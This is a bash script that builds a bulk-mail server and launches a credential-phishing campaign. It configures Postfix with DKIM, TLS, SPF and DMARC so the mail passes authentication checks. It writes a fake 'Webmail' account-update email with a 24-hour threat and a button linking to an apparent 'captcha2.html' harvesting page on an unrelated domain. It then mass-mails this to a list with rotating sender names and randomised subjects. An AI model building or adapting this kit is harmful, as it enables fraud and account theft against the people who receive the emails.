#!/bin/bash

# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

# === Predefined values ===
myhostname="mail.admailsend.com"
mydomain="admailsend.com"
sender_email="supportzed@$mydomain"
sender_name="EMAIL UPDATE"
email_subject="WEBMAIL SECURE MESSAGE"
email_list="list.txt"

# === Install required packages ===
echo "Updating packages and installing dependencies..."
apt-get update -y
apt-get install -y postfix opendkim opendkim-tools tmux mailutils certbot

# === TLS certificate ===
echo "Obtaining Let’s Encrypt certificate for $myhostname..."
certbot certonly --standalone -d $myhostname --non-interactive --agree-tos -m admin@$mydomain || {
  echo "⚠️ Certbot failed — make sure DNS A record for $myhostname points here."
}

# === Backup and replace Postfix config ===
echo "Backing up and replacing Postfix main.cf..."
cp /etc/postfix/main.cf /etc/postfix/main.cf.backup 2>/dev/null
rm -f /etc/postfix/main.cf

tee /etc/postfix/main.cf > /dev/null <<EOL
# === Identity ===
myhostname = $myhostname
mydomain = $mydomain
myorigin = /etc/mailname
mydestination = localhost

# === Networking ===
inet_interfaces = all
inet_protocols = ipv4

# === Relay ===
relayhost =

# === SASL (disabled) ===
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous

# === TLS inbound ===
smtpd_use_tls = yes
smtpd_tls_cert_file = /etc/letsencrypt/live/$myhostname/fullchain.pem
smtpd_tls_key_file = /etc/letsencrypt/live/$myhostname/privkey.pem
smtpd_tls_security_level = may
smtpd_tls_auth_only = yes
smtpd_tls_loglevel = 1

# === TLS outbound ===
smtp_tls_security_level = may
smtp_tls_loglevel = 1
smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt

# === OpenDKIM integration ===
milter_default_action = accept
milter_protocol = 6
smtpd_milters = unix:/opendkim/opendkim.sock
non_smtpd_milters = unix:/opendkim/opendkim.sock

# === Queues & dirs ===
queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
EOL

# === Configure OpenDKIM ===
echo "Configuring OpenDKIM..."
mkdir -p /etc/opendkim/keys/$mydomain

cat > /etc/opendkim.conf <<EOL
Syslog                  yes
UMask                   002
Socket                  local:/opendkim/opendkim.sock
PidFile                 /var/run/opendkim/opendkim.pid
Mode                    sv
Domain                  $mydomain
KeyFile                 /etc/opendkim/keys/$mydomain/mail.private
Selector                mail
Canonicalization        relaxed/simple
OversignHeaders         From
TrustAnchorFile         /usr/share/dns/root.key
EOL

# Generate DKIM keys
opendkim-genkey -D /etc/opendkim/keys/$mydomain/ -d $mydomain -s mail
chown -R opendkim:opendkim /etc/opendkim/keys/$mydomain
chmod 600 /etc/opendkim/keys/$mydomain/mail.private

# Add key to KeyTable and SigningTable
cat > /etc/opendkim/KeyTable <<EOL
mail._domainkey.$mydomain $mydomain:mail:/etc/opendkim/keys/$mydomain/mail.private
EOL

cat > /etc/opendkim/SigningTable <<EOL
*@${mydomain} mail._domainkey.${mydomain}
EOL

cat > /etc/opendkim/TrustedHosts <<EOL
127.0.0.1
localhost
$mailhostname
EOL

# Fix socket dir
mkdir -p /opendkim
chown opendkim:opendkim /opendkim

# Enable services
systemctl enable opendkim
systemctl restart opendkim
systemctl restart postfix

# === Create email.html ===
echo "Creating email.html..."
cat > email.html <<EOL
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Action Required: Update Your Account</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f2f4f8;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 600px;
      margin: 40px auto;
      background-color: #ffffff;
      border-radius: 10px;
      padding: 30px 40px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
    }
    .header {
      text-align: center;
      margin-bottom: 25px;
    }
    .header img {
      max-width: 180px;
      margin-bottom: 10px;
    }
    .title {
      font-size: 22px;
      font-weight: 600;
      color: #0077cc;
    }
    .content {
      font-size: 16px;
      color: #444;
      line-height: 1.7;
    }
    .content p {
      margin: 16px 0;
    }
    .button-container {
      text-align: center;
      margin-top: 30px;
    }
    .cta-button {
      background-color: #0077cc;
      color: #ffffff;
      padding: 14px 28px;
      border-radius: 6px;
      text-decoration: none;
      font-size: 16px;
      font-weight: 600;
      transition: background-color 0.3s ease;
    }
    .cta-button:hover {
      background-color: #005fa3;
    }
    .footer {
      margin-top: 40px;
      font-size: 12px;
      color: #888;
      text-align: center;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img src="https://ik.imagekit.io/yleultaj4/webmail.jpg?updatedAt=1747527364367" alt="Webmail Logo" />
      <div class="title">Action Required: Update Your Account</div>
    </div>
    <div class="content">
      <p>Dear {{EMAIL}},</p>
      <p>We have recently updated our <strong>Webmail Terms of Service</strong> to better serve you and enhance the security of your account.</p>
      <p>To ensure uninterrupted access, we kindly request you to verify and update your account details.</p>
      <p><strong>What you need to do:</strong><br>
      Click the button below to review and confirm your account information.</p>
      <p><strong>Please Note:</strong><br>
      Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
    </div>
    <div class="button-container">
      <a href="https://avrentalservicesorlando.com/it/captcha2.html?email={{EMAIL}}" class="cta-button">Update Account</a>
    </div>
    <div class="footer">
      &copy; 2025 Webmail Services. All rights reserved.<br />
      This is an automated message—please do not reply.
    </div>
  </div>
</body>
</html>
EOL
chmod 664 email.html

# === Create send.sh ===
echo "Creating send.sh..."
cat > send.sh <<'EOL'
#!/bin/bash
counter=1
while IFS= read -r email; do
  echo "Sending email to: $email"
  from_username="supportzed$counter"
  from_domain="admailsend.com"
  from_email="$from_username@$from_domain"
  from_name="EMAIL UPDATE"
  from_header="$from_name <$from_email>"
  random_number=$(shuf -i 100-999 -n 1)
  subject="SECURE MESSAGE - [Your email is outdated] ! ($random_number)"
  subdomain=$(tr -dc 'a-z' </dev/urandom | head -c3)
  html_content=$(sed "s/{{EMAIL}}/$email/g; s/{{SUBDOMAIN}}/$subdomain/g" email.html)
  cat <<EOF | /usr/sbin/sendmail -t
To: $email
From: $from_header
Subject: $subject
MIME-Version: 1.0
Content-Type: text/html

$html_content
EOF
  ((counter++))
done < list.txt
EOL

chmod +x send.sh

# === Run in tmux ===
echo "Starting tmux session for bulk email sending..."
tmux new-session -d -s mail_session "./send.sh"

echo "Creating list.txt..."
cat > list.txt <<EOL
EOL

# === DNS Records instructions ===
echo ""
echo "✅ Setup complete."
echo "Add the following DNS records for $mydomain:"
echo ""
echo "SPF:"
echo "  $mydomain. IN TXT \"v=spf1 mx ~all\""
echo ""
echo "DKIM (mail selector):"
cat /etc/opendkim/keys/$mydomain/mail.txt
echo ""
echo "DMARC:"
echo "  _dmarc.$mydomain. IN TXT \"v=DMARC1; p=quarantine; rua=mailto:postmaster@$mydomain\""
echo ""
echo "PTR (Reverse DNS):"
echo "  Ensure your server IP resolves back to $myhostname"
echo ""
echo "Reattach tmux: tmux attach -t mail_session"
